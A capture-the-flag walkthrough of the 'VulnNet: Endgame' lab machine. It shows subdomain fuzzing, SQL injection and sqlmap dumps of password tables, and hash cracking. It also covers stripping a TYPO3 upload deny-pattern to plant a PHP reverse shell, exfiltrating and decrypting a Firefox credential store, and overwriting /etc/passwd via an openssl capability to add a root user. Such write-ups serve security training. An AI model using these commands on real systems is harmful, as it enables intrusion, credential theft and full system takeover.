# VulnNet: Endgame WriteUp
## Machine's IP = 10.80.143.157
First of all, I wanted to do port scan:
```bash
rustscan -a 10.80.143.157
```
Two ports are open: 22 and 80. Let's look at what we can find on the web site? Yeah, we need to add "vulnnet.thm" domain to /etc/hosts file. There was nothing important. So, I made a directory scan.
```bash
ffuf -u http://vulnnet.thm/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -fs 0
```
I didn't get anything from there. So, maybe there are some subdomains. Let's check.
```bash
ffuf -H "Host: FUZZ.vulnnet.thm" -u http://vulnnet.thm -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -fs 65
```
Yeah, I get 4 subdomains: **[api], [shop], [blog], [admin1]**. Let's check them one-by-one after adding into /etc/hosts file.
1. http://api.vulnnet.thm/ ---> It is an empty page
2. http://blog.vulnnet.thm/ ---> There is a username as "SkyWaves" but I am not sure if it will be useful. But in the source code, I sawa line like this **"getJSON('http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1',  function(err, data) {"**. It connected the "empty" API subdomain to a functional endpoint. It revealed the hidden directory structure: /vn_internals/api/v2/fetch/. The ?blog= parameter is a high-value target for LFI (Local File Inclusion) or SSRF testing. I will check it but let's discovery other domains before. I didn't want to miss something important.
3. http://shop.vulnnet.thm/ ---> In this page, I saw a login button which doesn't work. Maybe it was a rabbit hole. The source code also didn't give any hint.
4. http://admin1.vulnnet.thm/ ---> It also looks empty as api.

----

I decided to do directory scan for all of these subdomains and check the results to find anything important.
```bash
ffuf -u http://api.vulnnet.thm/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -fs 0
ffuf -u http://blog.vulnnet.thm/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -fs 0
ffuf -u http://shop.vulnnet.thm/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -fs 0
```
They didn't give any result, but the "admin1" subdomain has interesting results:
```bash
ffuf -u http://admin1.vulnnet.thm/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -fs 0
###############
.htpasswd               [Status: 403, Size: 283, Words: 20, Lines: 10, Duration: 2873ms]
.htaccess               [Status: 403, Size: 283, Words: 20, Lines: 10, Duration: 3899ms]
.hta                    [Status: 403, Size: 283, Words: 20, Lines: 10, Duration: 4878ms]
en                      [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 91ms]
fileadmin               [Status: 301, Size: 328, Words: 20, Lines: 10, Duration: 108ms]
server-status           [Status: 403, Size: 283, Words: 20, Lines: 10, Duration: 95ms]
typo3                   [Status: 301, Size: 324, Words: 20, Lines: 10, Duration: 92ms]
typo3conf               [Status: 301, Size: 328, Words: 20, Lines: 10, Duration: 91ms]
typo3temp               [Status: 301, Size: 328, Words: 20, Lines: 10, Duration: 87ms]
vendor                  [Status: 301, Size: 325, Words: 20, Lines: 10, Duration: 87ms]
###############
```
----
I checked all of them but only **"typo3"** directory was useful. THere eas a login page:  
We dont have credentials. So lets explore more. There is two main thing for us to do. "Find the version of "TYPO3" or to look at "http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1" to find any vulnerability. I prefered to start with the url.  
|      
<img width="1254" height="388" alt="Screenshot From 2026-02-19 20-05-55" src="https://github.com/user-attachments/assets/4233a5e3-3236-491b-aef6-0d945a9abc71" />  
|    
Let's test for Local File Inclusion?  
|    
<img width="1713" height="374" alt="Screenshot From 2026-02-19 20-07-34" src="https://github.com/user-attachments/assets/34c1b81e-f833-4642-be0f-29b5020d3f70" />  
|    
Hmm, it didn't work. I decided to write malicious sql query to figure out if there is a SQL vulnerability. How to do it?  
|    
<img width="1713" height="374" alt="Screenshot From 2026-02-19 20-12-17" src="https://github.com/user-attachments/assets/53ca9f1d-d0f9-4193-b0e9-8920412a5a93" />  
|    
As you can see there isn't any blog with id=99, so it gave an error. But when I entered 99 OR 1=1, the database didn't just look for ID 99. It processed my logic:  
 -- "Is the ID 99?" (No)  
 -- "OR is 1 equal to 1?" (Yes, always!)  
Because 1=1 is always true, the database "got confused" and gave me the first result it found (blog_id: 1) instead of an error.  
|  
<img width="1713" height="374" alt="Screenshot From 2026-02-19 20-15-17" src="https://github.com/user-attachments/assets/a72684b6-b6b8-4628-a8d2-5e9c9279c8b0" />  
|  
Bingoo, there is SQL vulnerability. I also want to check it with SqlMap tool.  
```bash
sqlmap -u "http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1" -p blog --dbs
```
We already knew that the vulnerability was on "blog" parameter. So, I specially mentioned it on the command. There was three databases:
[*] blog
[*] information_schema
[*] vn_admin
We need to check "vn_admin" at first:
```bash
sqlmap -u "http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1" -p blog -D vn_admin --tables
```
The "be_users" table is intersting for me. Lets look what is inside it:
```bash
sqlmap -u "http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1" -p blog -D vn_admin -T be_users --columns
sqlmap -u "http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1" -p blog -D vn_admin -T be_users -C username,password --dump
```
|  
<img width="1494" height="143" alt="Screenshot From 2026-02-19 20-28-27" src="https://github.com/user-attachments/assets/5b12f45b-58a9-4719-a56a-001f39c41130" />
|  
Yeahh, I found a username and its hash password but I cannot decrypt it with normal rockyou.txt wordlist by john. Because Argon2 is more modern and it is very hard to crack. So, we need a specific wordlist for it. Let's explore a little bit more. For example, we can check blog database as well.
```bash
sqlmap -u "http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1" -p blog --dbms=mysql -D blog --tables
sqlmap -u "http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1" -p blog -D blog -T users --columns
sqlmap -u "http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1" -p blog -D blog -T users -C username,password --dump
```
There are more than one hundred usernames and their corresponding passwords. I take all these passwords, create a list which I will use to crack **"chris_w"** user's password hash. Let's create this wordlist:
```bash
cat ~/.local/share/sqlmap/output/api.vulnnet.thm/dump/blog/users.csv | cut -d "," -f2 > passlist.txt
```
Yeah, our wordlist is ready right now. Lets crack the has by the help of john:
```bash
echo '$argon2i$v=19$m=65536,t=16,p=2$UnlVSEgyMUFnYnJXNXlXdg$j6z3IshmjsN+CwhciRECV2NArQwipqQMIBtYufyM4Rg' > hash
john --wordlist=passlist.txt hash
john --show hash
```
We got the user's password. As you remember we had a login page on "admin1.vulnnet.thm" subdirectory. Let's access this account. 
|    
<img width="2664" height="1823" alt="Screenshot From 2026-02-19 20-43-27" src="https://github.com/user-attachments/assets/d8e40eec-2026-4d45-94ef-b9f01e25067d" />
|  
Yeah, I explored the sidebar to find interesting places and yeahh I found the **"filelist"** section, my favoriteee!!!. I saw that I can upload a file, so I immediately tried to upload the "reverseshell.php" file from the pentest monkey. But nooo, there is a restriction. It show a message like "Filename "reverseshell.php" is not allowed!". But why?? I searched a little bit more and find another critical section on the navbar.
|  
<img width="2034" height="1264" alt="Screenshot From 2026-02-19 20-48-36" src="https://github.com/user-attachments/assets/8ab7724a-4f91-4cd7-8c4b-d8974f484d80" />
|  
As you can see, we can access "Configure Installation-Wide Options". Lets change the rules :))).
|  
<img width="1266" height="1141" alt="Screenshot From 2026-02-19 20-50-27" src="https://github.com/user-attachments/assets/36dcfbf5-0d80-47a5-8e24-eb00a1d959ac" />
|  
I filtered "file" and found the limitation in there. After removin this part **"\.(php[3-8]?|phpsh|phtml|pht|phar|shtml|cgi)(\..*)?$|\.pl$|^\.htaccess$"**, we must click **"Write Configuration"**. Now, we can upload this file. Lets check:
|  
<img width="2259" height="258" alt="Screenshot From 2026-02-19 20-52-42" src="https://github.com/user-attachments/assets/3121f4cd-bd98-4678-a72f-5f9cbb25ca84" />
|  
We are successfull!!!!!!. The last thing we need to do is log out the user and open this url: "http://admin1.vulnnet.thm/fileadmin/reverseshell.php". But, don't forget to open nc listener on your terminal before this.

----

We got a shell. I saw .mozilla folder of the "system" user. It is so essential for us. Because when you input your credential on the browser, it asks you: Would you want me to save your username and password?. If you click "save" they are stored in ".mozilla/firefox/profile_name/logins.json". If we can read it, we can get so much data from there. 
```bash
</system/.mozilla/firefox/2fjnrwth.default-release$ cat logins.json
cat logins.json
{"nextId":2,"logins":[{"id":1,"hostname":"https://tryhackme.com","httpRealm":null,"formSubmitURL":"https://tryhackme.com","usernameField":"email","passwordField":"password","encryptedUsername":"MEIEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECGTdteVlY+xxBBjfIPYRG22oqSkatzSobyWk2xPX4TiOOKE=","encryptedPassword":"MEIEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECHu6efDMbAwDBBjp+XbxLGvfpavdVwdpPFupNpNwheQ+A5Y=","guid":"{8fa24ee9-208e-41f9-a718-eb6a770d70b8}","encType":1,"timeCreated":1654970290415,"timeLastUsed":1654970290415,"timePasswordChanged":1654970290415,"timesUsed":1}],"potentiallyVulnerablePasswords":[],"dismissedBreachAlertsByLoginGUID":{},"version":3}</system/.mozilla/firefox/2fjnrwth.default-release$
```
1. I couldn't understand anything from here. I decided to use "firefox_decrypt" tool that you can find from this github repository -> "https://github.com/unode/firefox_decrypt". I installed it on my own terminal.
Since we didn't have write permissions in that directory to create an archive, we used the /tmp folder (which is world-writable) as our staging area.
```bash
/system/.mozilla/firefox/2fjnrwth.default-release$ tar -czvf /tmp/firefox_profiles.tar.gz .
```
Purpose: To bundle all profile files (including the encrypted passwords) into a single, portable package.

----
2. To move the archive to our local Kali machine, we set up a temporary web server on the target machine.
```bash
On Target: cd /tmp && python3 -m http.server 8080
On Kali: wget http://10.80.143.157:8080/firefox_profiles.tar.gz
```
Purpose: To transfer the sensitive encrypted data from the target server to your local environment for offline analysis.

----
3. Once the file was on our machine, we extracted it to access the internal Firefox files.
```bash
tar -xzvf firefox_profiles.tar.gz
```
Result: This gave us direct access to logins.json (the encrypted vault) and key4.db (the key database).


----
4. We used a specialized tool, firefox_decrypt.py, to break the Firefox encryption.
```bash
python3 firefox_decrypt.py .
```
Purpose: We pointed the script to the current directory (represented by the dot .). It used key4.db to unlock the secrets inside logins.json.  
Result: The script output the cleartext passwords that the system user had saved in their browser. Since we have the password, let's access the system user's account:
```bash
su system
```
----
We got the **"USER FLAG"** from this user's home directory.
```bash
cat /home/system/user.txt
```
----
# Privilege Escalation
I checked "sudo -l" but this user don't have any sudo permission in this machine. So, I decided to check getcap:
```bash
getcap / -r 2>/dev/null
```
|  
<img width="1488" height="236" alt="Screenshot From 2026-02-19 21-26-27" src="https://github.com/user-attachments/assets/47faffa4-d701-48dd-bf52-62c28177d2fc" />
|  
I search about them and saw that "/home/system/Utils/openssl =ep" will be useful. Since the openssl binary has the +ep capability (Effective and Permitted), it means it can bypass file permission checks. This allows you to read or write to any file on the system, including /etc/passwd. The most reliable way to get root is to add a new user with UID 0 to the /etc/passwd file.  
1. At first, I need a password key which will be stored on /etc/passwd file. So, lets create a hash.  
```bash
openssl passwd -1 123
```
We got a hash like "$1$oyuMxSrO$CuLUJPaDvJThIZYSy2Qwm/"

----
2. We cannot directly change /etc/passwd file, so I must copy it into another file and I will add the new user into there.
```bash
cat /etc/passwd > /tmp/passwd.new
echo 'pwned:$1$oyuMxSrO$CuLUJPaDvJThIZYSy2Qwm/:0:0:root:/root:/bin/bash' >> /tmp/passwd.new
```

----
3. Now, I use the openssl to add this created fake version of /etc/passwd file on the real one.
```bash
cat /tmp/passwd.new | /home/system/Utils/openssl enc -out /etc/passwd
```

----
4. Finally I can be root by using the new username and its plain password(123):
```bash
system@vulnnet-endgame:~$ su pwned
su pwned
Password: 123

root@vulnnet-endgame:/home/system#
```

We can get the root.txt file from there because we are root right now. 




























